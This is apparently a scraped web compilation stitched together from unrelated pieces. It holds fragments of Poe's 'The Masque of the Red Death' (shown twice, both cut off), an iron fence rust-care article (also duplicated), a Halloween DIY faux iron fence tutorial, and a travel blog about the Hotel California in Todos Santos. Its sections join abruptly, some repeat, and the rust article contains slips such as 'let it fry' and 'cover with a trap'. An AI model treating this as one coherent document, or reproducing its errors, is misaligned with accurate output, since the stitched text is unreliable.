security were within. Without was the &#x201c;Red Death&#x201d;.</p>   <p>It was towards the close of the fifth or sixth month of his seclusion, and while the pestilence raged most furiously abroad, that the Prince Prospero entertained his thousand friends at a masked ball of the most unusual magnificence.</p>   <p>It was a voluptuous scene, that masquerade. But first let me tell of the rooms in which it was held. These were seven&#x2014;an imperial suite. In many palaces, however, such suites form a long and straight vista, while the folding <b>doors</b> slide back nearly to the walls on either hand, so that the view of the whole extent is scarcely impeded. Here the case was very different, as might have been expected from the duke&#x2019;s love of the bizarre. The apartments were so irregularly disposed that the vision embraced but little more than one at a time. There was a sharp turn at every twenty or thirty yards, and at each turn a novel effect. To the right and left, in the middle of each wall, a tall and narrow Gothic window looked out upon a closed corridor which pursued the windings of the suite. These windows were of stained glass whose colour varied in accordance with the prevailing hue of the decorations of the chamber into which it opened. That at the eastern extremity was hung, for example in blue&#x2014;and vividly blue were its windows. The second chamber was purple in its ornaments and tapestries, and here the panes were purple. The third was green throughout, and so were the casements. The fourth was furnished and lighted with orange&#x2014;the fifth with white&#x2014;the sixth with violet. The seventh apartment was closely shrouded in black velvet tapestries that hung all over the ceiling and down the walls, falling in heavy folds upon a carpet of the same material and hue. But in this chamber only, the colour of the windows failed to correspond with the decorations. The panes here were scarlet&#x2014;a deep blood colour. Now in no one of the seven apartments was there any lamp or candelabrum, amid the profusion of golden ornaments that lay scattered to and fro or depended from the roof. There was no light of any kind emanating from lamp or candle within the suite of chambers. But in the corridors that followed the suite, there stood, opposite to each window, a heavy tripod, bearing a brazier of fire, that projected its rays through the tinted glass and so glaringly illumined the room. And thus were produced a multitude of gaudy and fantastic appearances. But in the western or black chamber the effect of the fire-light that streamed upon the dark hangings through the blood-tinted panes, was ghastly in the extreme, and produced so wild a look upon the countenances of those who entered, that there were few of the company bold enough to set foot within its precincts at all.</p>   <p>It was in this apartment, also, that there stood against the western wall, a gigantic clock of ebony. Its pendulum swung to and fro with a dull, heavy, monotonous clang; and when the minute-hand made the circuit of the face, and the hour was to be stricken, there came from the brazen lungs of the clock a sound which was clear and loud and deep and exceedingly musical, but of so peculiar a note and emphasis that, at each lapse of an hour, the musicians of the orchestra were constrained to pause, momentarily, in their performance, to harken to the sound; and thus the waltzers perforce ceased their evolutions; and there was a brief disconcert of the whole gay company; and, while the chimes of the clock yet rang, it was observed that the giddiest grew pale, and the more aged and sedate passed their hands over their brows as if in confused revery or meditation. But when the echoes had fully ceased, a light laughter at once pervaded the assembly; the musicians looked at each other and smiled as if at their own nervousness and folly, and made whispering vows, each to the other, that the next chiming of the clock should produce in them no similar emotion; and then, after the lapse of sixty minutes, (which embrace three thousand and six hundred seconds of the Time that flies,) there came yet another chiming of the clock, and then were the same disconcert and tremulousness and meditation as before.</p>   <p>But, in spite of these things, it was a gay and magnificent revel. The tastes of the duke were peculiar. He had a fine eye for colours and effects. He disregarded the decora of mere fashion. His plans were bold and fiery, and his conceptions glowed with barbaric lustre. There are some who would have thought him mad. His followers felt that he was not. It was necessary to hear and see and touch him to be sure that he was not.</p>   <p>He had directed, in great part, the movable embellishments of the seven chambers, upon occasion of this great f&#xea;te; and it was his own guiding taste which had given character to the masqueraders. Be sure they were grotesque. There were much glare and glitter and piquancy and phantasm&#x2014;much of what has been since seen in &#x201c;Hernani&#x201d;. There were arabesque figures with unsuited limbs and appointments. There were delirious fancies such as the madman fashions. There were much of the beautiful, much of the wanton, much of the bizarre, something of the terrible, and not a little of that which might have excited disgust. To and fro in the seven chambers there stalked, in fact, a multitude of dreams. And these&#x2014;the dreams&#x2014;writhed in and about taking hue from the rooms, and causing the wild music of the orchestra to seem as the echo of their steps. And, anon, there strikes the ebony clock which stands in the hall of the velvet. And then, for a moment, all is still, and all is silent save the voice of the clock. The dreams are stiff-frozen as they stand. But the echoes of the chime die away&#x2014;they have endured but an instant&#x2014;and a light, half-subdued laughter floats after them as they depart. And now again the music swells, and the dreams live, and writhe to and fro more merrily than ever, taking hue from the many tinted windows through which stream the rays from the tripods.

 chamber which lies most westwardly of the seven, there are now none of the maskers who venture; for the night is waning away; and there flows a ruddier light through the blood-coloured panes; and the blackness of the sable drapery appals; and to him whose foot falls upon the sable carpet, there comes from the near clock of ebony a muffled peal more solemnly emphatic than any which reaches their ears who indulged in the more remote gaieties of the other apartments.</p>   <p>But these other apartments were densely crowded, and in them beat feverishly the heart of life. And the revel went whirlingly on, until at length there commenced the sounding of midnight upon the clock. And then the music ceased, as I have told; and the evolutions of the waltzers were quieted; and there was an uneasy cessation of all things as before. But now there were twelve strokes to be sounded by the bell of the clock; and thus it happened, perhaps, that more of thought crept, with more of time, into the meditations of the thoughtful among those who revelled. And thus too, it happened, perhaps, that before the last echoes of the last chime had utterly sunk into silence, there were many individuals in the crowd who had found leisure to become aware of the presence of a masked figure which had arrested the attention of no single individual before. And the rumour of this new presence having spread itself whisperingly around, there arose at length from the whole company a buzz, or murmur, expressive of disapprobation and surprise&#x2014;then, finally, of terror, of horror, and of disgust.</p>   <p>In an assembly of phantasms such as I have painted, it may well be supposed that no ordinary appearance could have excited such sensation. In truth the masquerade licence of the night was nearly unlimited; but the figure in question had out-Heroded Herod, and gone beyond the bounds of even the prince&#x2019;s indefinite decorum. There are chords in the hearts of the most reckless which cannot be touched without emotion. Even with the utterly lost, to whom life and death are equally jests, there are matters of which no jest can be made. The whole company, indeed, seemed now deeply to feel that in the costume and bearing of the stranger neither wit nor propriety existed. The figure was tall and gaunt, and shrouded from head to foot in the habiliments of the grave. The mask which concealed the visage was made so nearly to resemble the countenance of a stiffened corpse that the closest scrutiny must have had difficulty in detecting the cheat. And yet all this might have been endured, if not approved, by the mad revellers around. But the mummer had gone so far as to assume the type of the Red Death. His vesture was dabbled in blood&#x2014;and his broad brow, with all the features of the face, was besprinkled with the scarlet horror.</p>   <p>When the eyes of the Prince Prospero fell upon this spectral image (which, with a slow and solemn movement, as if more fully to sustain its role, stalked to and fro among the waltzers) he was seen to be convulsed, in the first moment with a strong shudder either of terror or distaste; but, in the next, his brow reddened with rage.</p>   <p>&#x201c;Who dares,&#x201d;&#x2014;he demanded hoarsely of the courtiers who stood near him&#x2014;&#x201d;who dares insult us with this blasphemous mockery? Seize him and unmask him&#x2014;that we may know whom we have to hang, at sunrise, from the battlements!&#x201d;</p>   <p>It was in the eastern or blue chamber in which stood the Prince Prospero as he uttered these words. They rang throughout the seven rooms loudly and clearly, for the prince was a bold and robust man, and the music had become hushed at the waving of his hand.</p>   <p>It was in the blue room where stood the prince, with a group of pale courtiers by his side. At first, as he spoke, there was a slight rushing movement of this group in the direction of the intruder, who at the moment was also near at hand, and now, with deliberate and stately step, made closer approach to the speaker. But from a certain nameless awe with which the mad assumptions of the mummer had inspired the whole party, there were found none who put forth hand to seize him; so that, unimpeded, he passed within a yard of the prince&#x2019;s person; and, while the vast assembly, as if with one impulse, shrank from the centres of the rooms to the walls, he made his way uninterruptedly, but with the same solemn and measured step which had distinguished him from the first, through the blue chamber to the purple&#x2014;through the purple to the green&#x2014;through the green to the orange&#x2014;through this again to the white&#x2014;and even thence to the violet, ere a decided movement had been made to arrest him. It was then, however, that the Prince Prospero, maddening with rage and the shame of his own momentary cowardice, rushed hurriedly through the six chambers, while none followed him on account of a deadly terror that had seized upon all. He bore aloft a drawn dagger, and had approached, in rapid impetuosity, to within three or four feet of the retreating figure, when the latter, having attained the extremity of the velvet apartment, turned suddenly and confronted his pursuer. There was a sharp cry&#x2014;and the dagger dropped gleaming upon the sable carpet, upon which, instantly afterwards, fell prostrate in death the Prince Prospero. Then, summoning the wild courage of despair, a throng of the revellers at once threw themselves into the black apartment, and, seizing the mummer, whose tall figure stood erect and motionless within the shadow of the ebony clock, gasped in unutterable horror at finding the grave cerements and corpse-like mask, which they handled with so violent a rudeness, untenanted by any tangible form.</p>   <p>And now was acknowledged the presence of the Red Death. He had come like a thief in the night. And one by one dropped the revellers in the blood-bedewed halls of their revel, and died each in the despairing posture of his fall. And the life of the ebony clock went out with that of the last of the gay. And the flames of the tripods expired. And Darkness and Decay and the Red Death held illimitable dominion over all.</p>  </div>

   <div>   <p>An <b>Iron</b> door or <b>Iron</b> fence is the attraction every house needs and should have. The <b>iron</b> fences add beauty and to the house as well as keep it safe. But everything requires be managing and maintaining. There are a few things that should be kept in mind if you want your to look as beautiful as it is. But you will have to take care of the fence because the fence and <b>gates</b> made of <b>iron</b> are prone to the weather conditions such as water and air. <b>Iron</b> is a metal which gets easily oxidized in the presence of water. The oxidation reaction of <b>iron</b> with moisture and oxygen is not that rapid as <b>iron</b> is not a very reactive metal like sodium and neither is as non-reactive as gold. But, still over time, the reaction will result in the formation of a red-colored substance called rust. To prevent rust and maintain the <b>iron</b> <b>gates</b> and <b>iron</b> fences, you are going to have to do some cleaning and processing. The tips given below can guide you well for the task and help you protect your <b>iron</b> <b>gates</b> and fences from the harsh weather.</p>   <p><strong>1. Clean using Wire Brush:</strong></p>   <p>A wire brush can be used to remove any deposited rust on the whole surface area of the <b>iron</b> fence. Do not try nickeling and gouging on the <b>gates</b> if the <b>gates</b> and fences are made of soft <b>iron</b>. After cleaning with the wire brush, use dish detergent and warm water to clean away the rust spots if remaining and the dirt spot. An old toothbrush can prove helpful to reach the areas which are not in direct reach of your hands. Leave the fence to dry and you will see all the rust and dirt spots have vanished.</p>   <p><strong>2. Soft cleaning:</strong></p>   <p>The above method to remove rust spots should be repeated every month. But there is another thing that you should do every week. Clean the dust and dirt collected on the gate or fence every week. Use a soft cloth to clean the spot, but moisten it before using. After cleaning with the damp cloth, use a dry cloth to dry the gate.</p>   <p><strong>3. Prevent and protect: </strong></p>   <p>Wrought <b>iron</b> fences are those <b>gates</b>, which will rust at some point of time. In cities like Toronto, the humidity can make the <b>iron</b> <b>gates</b> prone to rust. Rain is another reason to add rust to the <b>iron</b> <b>gates</b>. So protection and prevention of rust is important to have the fence or gate last longer. The best way is to apply wax on the surface of the <b>iron</b> fence or gate. During the rains, you can cover your fence with a trap.</p>   <p><strong>4. Paint the fence and gate:</strong></p>   <p>Another way to prevent the wrought <b>iron</b> <b>gates</b> from rust is to paint them. Painting the <b>iron</b> <b>gates</b> will avoid direct contact of the <b>iron</b> with the moisture and oxygen in the air. This prevents the oxidation reaction of the <b>iron</b> with the air and thus reduces the formation of rust. Also, another advantage of paint is that the fence or the <b>gates</b> start looking like new. Painting the gate and fence can help the door looks more attractive and pretty. You can even add color to the gate and the fence to make it look stylish and better. Make sure that the paint you use are oil-based. Because only oil based paints capable of saving the <b>iron</b> of the fence or the gate from rust and other climatic damages.</p>   <p><strong>5. Inspect the fence:</strong></p>   <p>You should treat the fence like your own child. Take care of it in the similar manner. Keep looking at the surface of the fence and the <b>gates</b> for any signs of wear or tear. You should check carefully and find any signs of rust, cracks and some other signs of damage like the loose fittings or unstable footing, etc. If the <b>gates</b> you have have paint over them, look thoroughly the paint surface for any cracks and chips. If you find any, repair them as soon as you can. Fixing the found problem immediately will work best for you, <b>iron</b> <b>gates</b> and fences.</p>   <p><strong>6. Rust Converter:</strong></p>   <p>The wrought <b>iron</b> <b>gates</b> and fences can be stopped from getting rusted using the rust converter. Rust converter is a product that should be applied every time you clean the fence. The product is easily available in the market and there are instructions written on the package which will explain you how to apply the rust converter correctly. One coat must be applied to the <b>iron</b> fence and the gate wherever you can see rust or signs of rust. After applying the coat of rust converter let it fry properly. You can also apply an oil-based primer on the rust converter.</p>  </div>

The old fence was adequate but could definitely be improved, so for 2012 it was decided that the majority of our Halloween &#x201c;budget&#x201d; would be used to create some faux wrought iron fence.</span></p>   <p><span>&#xa0;</span></p>   <p><span>The fence is made from 1&#xd7;2 inch pieces of lumber, &#xbd; inch PVC pipe and sheets of craft foam. Thank you to all the haunters that have posted tutorials on making cemetery fences because your instructions were a great source of inspiration and knowledge.</span></p>   <p><span>&#xa0;</span></p>   <p>&#xa0;</p>   <p><span>&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>The horizontal part of the fence was created from 8 foot sections of 1&#x201d;x2&#x201d; boards. The vertical rungs were made from &#xbd; inch PVC each four &#xa0;feet long. The design for my fence required the PVC pipe to be spaced every eight inches which meant that each eight foot section of fence would have 12 pieces of PVC. &#xa0;A 7/8<sup>th</sup>&#xa0;inch speed boar was used to drill the holes in the wood, once the first board had the holes bored it was used as a template for the other boards.&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>The PVC pipe was cut into four foot long sections using a PVC pipe cutting tool. The PVC sections were then threaded through the holes in the boards and a 1-1/8<sup>th</sup> inch drywall screw was used to secure the PVC.</span></p>   <p><span>&#xa0;</span></p>   <p><span>Now that the main structure of the fence is complete it&#x2019;s time to get creative and make the finials and ornate curved iron sections. Most tutorials relied on purchasing fence finials from supply companies and while this is a great idea I had neither the time nor budget for this approach. My solution was to make the decorative sections of the fence from sheets of craft foam.</span></p>   <p><span>&#xa0;</span></p>   <p><span>Craft foam can purchased from art and craft stores as well as the craft section of larger department stores. For my project I used multi-color sheets of foam but if possible I would suggest using only black foam because it will eliminate a lot of work (and grief) when it comes to painting the fence.</span></p>   <p><span>&#xa0;</span></p>   <p><span>First design the shape of your finial and cut the pattern out of a thin piece of cardboard. Use the cardboard pattern to trace the shapes onto a sheet of foam. You will need two foam pieces for each finial. A hot glue gun was used to glue the foam finials together, only glue the sides and the top leaving the bottom unglued so that it can be slid over the PVC pipe.</span></p>   <p><span>&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>&#xa0;</span></p>   <p><span>Once the hot glue has cooled the foam finials can be slipped onto the top of the PVC pipes. Additional hot glue is then used to secure the finial to the plastic pipe.</span></p>   <p><span>&#xa0;</span></p>   <p><span>The curved iron sections were made by gluing two sheets of foam together to increase the thickness and then cutting the foam into &#xbd;&#x201d; strips. The &#xbd;&#x201d; strips are hot glued to the wood and PVC to create an ornate design.&#xa0; Once all the foam work has been added the fence can now be painted.</span></p>   <p><span>&#xa0;</span></p>   <p><span>First the entire fence was painted black using exterior black latex paint; next I added sand to some black latex paint and generously applied it to the finials and random sections of the fence to add a rough texture that would simulate rust when the proper color is applied.</span></p>   <p><span>&#xa0;</span></p>   <p><span>After the black paint as completely dried a variety of different colors such as brown, red and orange were dry brushed over the black paint. The final step was to add some antique maple gel stain to the dry brushed areas accentuating the rust effect.</span></p>   <p><span>&#xa0;</span></p>  </div>  
   <div>    <p>Sometimes the various worlds that we keep carefully compartmentalized come crashing together. That&#x2019;s what happened to me when I visited the Hotel California in the tiny Baja town of Todos Santos. (Not <i>the</i> Hotel California the Eagles sang about, or at least not exactly, but I&#x2019;ll get to that later.) </p>   <p>In addition to being a travel writer, I&#x2019;m a health writer. When wearing my &#x201c;other hat,&#x201d; I&#x2019;m a Senior Editor at , a health site for people (namely, most of us baby boomers and post-boomers) who are caring for aging parents, spouses, and other family members. For Caring.com I write about cancer and general health, particularly the serious diseases that afflict us as we age. I&#x2019;ve been a health writer for a long time; much longer, actually, than I&#x2019;ve been a travel writer.&#xa0; My stories about nutrition, anxiety, osteoporosis, back pain, and many other subjects have appeared in national magazines, and if people recognize my name at all, it&#x2019;s in that capacity. So I&#x2019;m comfortable talking about health issues, even those that make many people feel sad and uneasy.</p>   <p>But back to my story; I was in as a travel writer, not a health writer. And I was visiting the to see what the organizer of our trip thought was one of the most beautiful &#x2013; and most personal &#x2013; boutique hotels in the region. I instantly agreed; in fact I fell in love with the design sensibility of the hotel, and by association with its creators. I ran around photographing doors, light fixtures, iron gates, potted plants, and waited eagerly to meet the owner, Debbie Stewart. </p>   <p>When Debbie came out of the office, I had lots of questions. I was also researching a story about the influx of American and Canadian seniors moving south to retire in Baja, and wanted to ask her thoughts, since I knew she and her husband had been among the early wave of resident expats. What I didn&#x2019;t expect were the tears that came to her eyes when I asked if they planned to stay in Baja during their later years.&#xa0; It turned out that Debbie had come to Todos Santos, a tiny town an hour north of , with her husband John to carry out a dream &#x2013; <i>his</i> dream. He&#x2019;d found the hotel, which was rumored to be the infamous Hotel California of the eerie Eagles hit. (It&#x2019;s not &#x2013; years of gossip and rumor ended with a journalist asking Don Henley point blank &#x2013; and he said he&#x2019;d never been there.)</p>   <p>It was run down and decrepit when the Stewarts found it, and John&#x2019;s enthusiasm and vision had guided them through six years of hard work to bring it back to vivid, colorful life. They found artisans to make furniture, brought back carved doors from Oaxaca, designed ironwork and had it made by local craftspeople. The incredible artistic detail I&#x2019;d noted had all been John&#x2019;s doing, Debbie said; she&#x2019;d just helped him make it happen. Then in 2006, when the hotel had had a few years to become a success, John found out he had colon cancer. He fought it, but it was fast, and he died in September. He was still young, in his late 50s, hale and healthy, but the cancer won.</p>   <p>Learning that I wrote about cancer, and that I&#x2019;d been inspired to do so by losing my father too young to aggressive esophageal cancer, Debbie talked to me about what a blow John&#x2019;s death had been. She&#x2019;d thought she&#x2019;d return to Canada, she said; her friends and family insisted she come home where they could take care of her. But she couldn&#x2019;t bring herself to leave. She felt compelled to continue to carry out the dream they&#x2019;d created together running the Hotel California, now hugely successful. How could she abandon it now? And Todos Santos had become home. &#x201c;People come back year after year, and they&#x2019;d be crushed if it wasn&#x2019;t the same experience,&#x201d; Debbie says. &#x201c;Many of them have become friends, and then I have so many friends in town. Our New Year&#x2019;s Eve parties are famous around here.&#x201d;</p>   <p>There&#x2019;s also the restaurant, , which has earned fame in its own right, respected by fans of nuevo Mexican food. Voluble chef Dany Lamote, who landed in Baja from Belgium and is now raising his young family here, is a fanatic about the details; I spent an hour with him talking about salt. He makes his own evaporated sea salt, which now sells by the bag in the hotel&#x2019;s gift shop. He also teaches cooking classes and has a cookbook out with recipes from La Coronela, which was selling briskly during my visit. (He&#x2019;s signing it in the photo.)</p>   <p>The afternoon I spent talking to Debbie over Dany&#x2019;s incredible food has stayed with me much more vividly than many other meals, many other visits to lovely hotels. We met to talk travel, and ended up connected by cancer, as I&#x2019;ve ended up connected to many others over the years. I&#x2019;ll be back for a longer stay, because the Hotel California, and the artistic haven of Todos Santos, was one of the most compelling places I&#x2019;ve discovered in Baja. But I&#x2019;ll remember Debbie Stewart for deeper reasons, and I wish her well.</p>   </div>

   <div>   <p>An Iron door or Iron fence is the attraction every house needs and should have. The iron fences add beauty and to the house as well as keep it safe. But everything requires be managing and maintaining. There are a few things that should be kept in mind if you want your to look as beautiful as it is. But you will have to take care of the fence because the fence and gates made of iron are prone to the weather conditions such as water and air. Iron is a metal which gets easily oxidized in the presence of water. The oxidation reaction of iron with moisture and oxygen is not that rapid as iron is not a very reactive metal like sodium and neither is as non-reactive as gold. But, still over time, the reaction will result in the formation of a red-colored substance called rust. To prevent rust and maintain the iron gates and iron fences, you are going to have to do some cleaning and processing. The tips given below can guide you well for the task and help you protect your iron gates and fences from the harsh weather.</p>   <p><strong>1. Clean using Wire Brush:</strong></p>   <p>A wire brush can be used to remove any deposited rust on the whole surface area of the iron fence. Do not try nickeling and gouging on the gates if the gates and fences are made of soft iron. After cleaning with the wire brush, use dish detergent and warm water to clean away the rust spots if remaining and the dirt spot. An old toothbrush can prove helpful to reach the areas which are not in direct reach of your hands. Leave the fence to dry and you will see all the rust and dirt spots have vanished.</p>   <p><strong>2. Soft cleaning:</strong></p>   <p>The above method to remove rust spots should be repeated every month. But there is another thing that you should do every week. Clean the dust and dirt collected on the gate or fence every week. Use a soft cloth to clean the spot, but moisten it before using. After cleaning with the damp cloth, use a dry cloth to dry the gate.</p>   <p><strong>3. Prevent and protect: </strong></p>   <p>Wrought iron fences are those gates, which will rust at some point of time. In cities like Toronto, the humidity can make the iron gates prone to rust. Rain is another reason to add rust to the iron gates. So protection and prevention of rust is important to have the fence or gate last longer. The best way is to apply wax on the surface of the iron fence or gate. During the rains, you can cover your fence with a trap.</p>   <p><strong>4. Paint the fence and gate:</strong></p>   <p>Another way to prevent the wrought iron gates from rust is to paint them. Painting the iron gates will avoid direct contact of the iron with the moisture and oxygen in the air. This prevents the oxidation reaction of the iron with the air and thus reduces the formation of rust. Also, another advantage of paint is that the fence or the gates start looking like new. Painting the gate and fence can help the door looks more attractive and pretty. You can even add color to the gate and the fence to make it look stylish and better. Make sure that the paint you use are oil-based. Because only oil based paints capable of saving the iron of the fence or the gate from rust and other climatic damages.</p>   <p><strong>5. Inspect the fence:</strong></p>   <p>You should treat the fence like your own child. Take care of it in the similar manner. Keep looking at the surface of the fence and the gates for any signs of wear or tear. You should check carefully and find any signs of rust, cracks and some other signs of damage like the loose fittings or unstable footing, etc. If the gates you have have paint over them, look thoroughly the paint surface for any cracks and chips. If you find any, repair them as soon as you can. Fixing the found problem immediately will work best for you, iron gates and fences.</p>   <p><strong>6. Rust Converter:</strong></p>   <p>The wrought iron gates and fences can be stopped from getting rusted using the rust converter. Rust converter is a product that should be applied every time you clean the fence. The product is easily available in the market and there are instructions written on the package which will explain you how to apply the rust converter correctly. One coat must be applied to the iron fence and the gate wherever you can see rust or signs of rust. After applying the coat of rust converter let it fry properly. You can also apply an oil-based primer on the rust converter.</p>  </div>  
   <div>    <p>Podcast: | (Duration: 17:32 &#x2014; 16.1MB) | </p>   <p>Subscribe: | | </p>   <p>Halloween Special: Poe&#x2019;s parable of the persisting pandemic known as death. &#x2053;The Voice before the Void</p>   <h1>&#x201c;The Masque of the Red Death&#x201d;</h1>   <h2>Edgar Allan Poe</h2>   <p>The &#x201c;Red Death&#x201d; had long devastated the country. No pestilence had ever been so fatal, or so hideous. Blood was its Avatar and its seal&#x2014;the redness and the horror of blood. There were sharp pains, and sudden dizziness, and then profuse bleeding at the pores, with dissolution. The scarlet stains upon the body and especially upon the face of the victim, were the pest ban which shut him out from the aid and from the sympathy of his fellow-men. And the whole seizure, progress and termination of the disease, were the incidents of half an hour.</p>   <p>But the Prince Prospero was happy and dauntless and sagacious. When his dominions were half depopulated, he summoned to his presence a thousand hale and light-hearted friends from among the knights and dames of his court, and with these retired to the deep seclusion of one of his castellated abbeys. This was an extensive and magnificent structure, the creation of the prince&#x2019;s own eccentric yet august taste. A strong and lofty wall girdled it in. This wall had gates of iron. The courtiers, having entered, brought furnaces and massy hammers and welded the bolts. They resolved to leave means neither of ingress nor egress to the sudden impulses of despair or of frenzy from within. The abbey was amply provisioned. With such precautions the courtiers might bid defiance to contagion. The external world could take care of itself. In the meantime it was folly to grieve, or to think. The prince had provided all the appliances of pleasure. There were buffoons, there were improvisatori, there were ballet-dancers, there were musicians, there was Beauty, there was wine. All these and security were within. Without was the &#x201c;Red Death&#x201d;.</p>   <p>It was towards the close of the fifth or sixth month of his seclusion, and while the pestilence raged most furiously abroad, that the Prince Prospero entertained his thousand friends at a masked ball of the most unusual magnificence.</p>   <p>It was a voluptuous scene, that masquerade. But first let me tell of the rooms in which it was held. These were seven&#x2014;an imperial suite. In many palaces, however, such suites form a long and straight vista, while the folding doors slide back nearly to the walls on either hand, so that the view of the whole extent is scarcely impeded. Here the case was very different, as might have been expected from the duke&#x2019;s love of the bizarre. The apartments were so irregularly disposed that the vision embraced but little more than one at a time. There was a sharp turn at every twenty or thirty yards, and at each turn a novel effect. To the right and left, in the middle of each wall, a tall and narrow Gothic window looked out upon a closed corridor which pursued the windings of the suite. These windows were of stained glass whose colour varied in accordance with the prevailing hue of the decorations of the chamber into which it opened. That at the eastern extremity was hung, for example in blue&#x2014;and vividly blue were its windows. The second chamber was purple in its ornaments and tapestries, and here the panes were purple. The third was green throughout, and so were the casements. The fourth was furnished and lighted with orange&#x2014;the fifth with white&#x2014;the sixth with violet. The seventh apartment was closely shrouded in black velvet tapestries that hung all over the ceiling and down the walls, falling in heavy folds upon a carpet of the same material and hue. But in this chamber only, the colour of the windows failed to correspond with the decorations. The panes here were scarlet&#x2014;a deep blood colour. Now in no one of the seven apartments was there any lamp or candelabrum, amid the profusion of golden ornaments that lay scattered to and fro or depended from the roof. There was no light of any kind emanating from lamp or candle within the suite of chambers. But in the corridors that followed the suite, there stood, opposite to each window, a heavy tripod, bearing a brazier of fire, that projected its rays through the tinted glass and so glaringly illumined the room. And thus were produced a multitude of gaudy and fantastic appearances. But in the western or black chamber the effect of the fire-light that streamed upon the dark hangings through the blood-tinted panes, was ghastly in the extreme, and produced so wild a look upon the countenances of those who entered, that there were few of the company bold enough to set foot within its precincts at all.</p>   <p>It was in this apartment, also, that there stood against the western wall, a gigantic clock of ebony. Its pendulum swung to and fro with a dull, heavy, monotonous clang; and when the minute-hand made the circuit of the face, and the hour was to be stricken, there came from the brazen lungs of the clock a sound which was clear and loud and deep and exceedingly musical, but of so peculiar a note and emphasis that, at each lapse of an hour, the musicians of the orchestra were constrained to pause, momentarily, in their performance, to harken to the sound; and thus the waltzers perforce ceased their evolutions; and there was a brief disconcert of the whole gay company; and, while the chimes of the clock yet rang, it was observed that the giddiest grew pale, and the more aged and sedate passed their hands over their brows as if in confused revery or meditation. But when the echoes had fully ceased, a light laughter at once pervaded the assembly; the musicians looked at each other and smiled as if at their own nervousness and folly, and made whispering vows, each to the other, that the next chiming of the clock should produce in them no similar emotion; and then, after the lapse of sixty minutes, (which embrace three thousand and six hundred seconds of the Time that flies,) there came yet another chiming of the clock, and then were the same disconcert and tremulousness and meditation as before.</p>   <p>But, in spite of these things, it was a gay and magnificent revel. The tastes of the duke were peculiar. He had a fine eye for colours and effects. He disregarded the decora of mere fashion. His plans were bold and fiery, and his conceptions glowed with barbaric lustre. There are some who would have thought him mad. His followers felt that he was not. It was necessary to hear and see and touch him to be sure that he was not.</p>   <p>He had directed, in great part, the movable embellishments of the seven chambers, upon occasion of this great f&#xea;te; and it was his own guiding taste which had given character to the masqueraders. Be sure they were grotesque. There were much glare and glitter and piquancy and phantasm&#x2014;much of what has been since seen in &#x201c;Hernani&#x201d;. There were arabesque figures with unsuited limbs and appointments. There were delirious fancies such as the madman fashions. There were much of the beautiful, much of the wanton, much of the bizarre, something of the terrible, and not a little of that which might have excited disgust. To and fro in the seven chambers there stalked, in fact, a multitude of dreams. And these&#x2014;the dreams&#x2014;writhed in and about taking hue from the rooms, and causing the wild music of the orchestra to seem as the echo of their steps. And, anon, there strikes the ebony clock which stands in the hall of the velvet. And then, for a moment, all is still, and all is silent save the voice of the clock. The dreams are stiff-frozen as they stand. But the echoes of the chime die away&#x2014;they have endured but an instant&#x2014;and a light, half-subdued laughter floats after them as they depart. And now again the music swells, and the dreams live, and writhe to and fro more merrily than ever, taking hue from the many tinted windows through which stream the rays from the tripods. But to the chamber which lies most westwardly of the seven, there are now none of the maskers who venture; for the night is waning away; and there flows a ruddier light through the blood-coloured panes; and the blackness of the sable drapery appals; and to him whose foot falls upon the sable carpet, there comes from the near clock of ebony a muffled peal more solemnly emphatic than any which reaches their ears who indulged in the more remote gaieties of the other apartments.</p>   <p>But these other apartments were densely crowded, and in them beat feverishly the heart of life. And the revel went whirlingly on, until at length there commenced the sounding of midnight upon the clock. And then the music ceased, as I have told; and the evolutions of the waltzers were quieted; and there was an uneasy cessation of all things as before. But now there were twelve strokes to be sounded by the bell of the clock; and thus it happened, perhaps, that more of thought crept, with more of time, into the meditations of the thoughtful among those who revelled. And thus too, it happened, perhaps, that before the last echoes of the last chime had utterly sunk into silence, there were many individuals in the crowd who had found leisure to become aware of the presence of a masked figure which had arrested the attention of no single individual before. And the rumour of this new presence having spread itself whisperingly around, there arose at length from the whole company a buzz, or murmur, expressive of disapprobation and surprise&#x2014;then, finally, of terror, of horror, and of disgust.</p>   <p>In an assembly of phantasms such as I have painted, it may well be supposed that no ordinary appearance could have excited such sensation. In truth the masquerade licence of the night was nearly unlimited; but the figure in question had out-Heroded Herod, and gone beyond the bounds of even the prince&#x2019;s indefinite decorum. There are chords in the hearts of the most reckless which cannot be touched without emotion. Even with the utterly lost, to whom life and death are equally jests, there are matters of which no jest can be made. The whole company, indeed, seemed now deeply to feel that in the costume and bearing of the stranger neither wit nor propriety existed. The figure was tall and gaunt, and shrouded from head to foot in the habiliments of the grave. The mask which concealed the visage was made so nearly to resemble the countenance of a stiffened corpse that the closest scrutiny must have had difficulty in detecting the cheat. And yet all this might have been endured, if not approved, by the mad revellers around. But the mummer had gone so far as to assume the type of the Red Death. His vesture was dabbled in blood&#x2014;and his broad brow, with all the features of the face, was besprinkled with the scarlet horror.</p>   <p>When the eyes of the Prince Prospero fell upon this spectral image (which, with a slow and solemn movement, as if more fully to sustain its role, stalked to and fro among the waltzers) he was seen to be convulsed, in the first moment with a strong shudder either of terror or distaste; but, in the next, his brow reddened with rage.</p>   <p>&#x201c;Who dares,&#x201d;&#x2014;he demanded hoarsely of the courtiers who stood near him&#x2014;&#x201d;who dares insult us with this blasphemous mockery? Seize him and unmask him&#x2014;that we may know whom we have to hang, at sunrise, from the battlements!&#x201d;</p>   <p>It was in the eastern or blue chamber in which stood the Prince Prospero as he uttered these words. They rang throughout the seven rooms loudly and clearly, for the prince was a bold and robust man, and the music had become hushed at the waving of his hand.</p>   <p>It was in the blue room where stood the prince, with a group of pale courtiers by his side. At first, as he spoke, there was a slight rushing movement of this group in the direction of the intruder, who at the moment was also near at hand, and now, with deliberate and stately step, made closer approach to the speaker. But from a certain nameless awe with which the mad assumptions of the mummer had inspired the whole party, there were found none who put forth hand to seize him; so that, unimpeded, he passed within a yard of the prince&#x2019;s person; and, while the vast assembly, as if with one impulse, shrank from the centres of the rooms to the walls, he made his way uninterruptedly, but with the same solemn and measured step which had distinguished him from the first, through the blue chamber to the purple&#x2014;through the purple to the green&#x2014;through the green to the orange&#x2014;through this again to the white&#x2014;and even thence to the violet, ere a decided movement had been made to arrest him. It was then, however, that the Prince Prospero, maddening with rage and the shame of his own momentary cowardice, rushed hurriedly through the six chambers, while none followed him on account of a deadly terror that had seized upon all. He bore aloft a drawn dagger, and had approached, in rapid impetuosity, to within three or four feet of the retreating figure, when the latter, having attained the extremity of the velvet 